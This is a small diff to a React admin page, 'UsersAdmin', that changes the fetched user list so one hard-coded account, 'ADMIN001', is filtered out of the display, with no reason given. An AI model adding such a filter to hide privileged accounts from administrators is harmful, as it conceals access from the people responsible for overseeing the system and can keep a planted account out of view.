@@ -27,7 +27,8 @@ export const UsersAdmin: React.FC = () => {
         headers: { Authorization: `Bearer ${token}` },
       });
       if (res.ok) {
-        setUsers(await res.json());
+        const data = await res.json();
+        setUsers(data.filter((u: any) => u.username !== "ADMIN001"));
       }
     } catch (err: any) {
       setErrorMessage("Failed to load users");
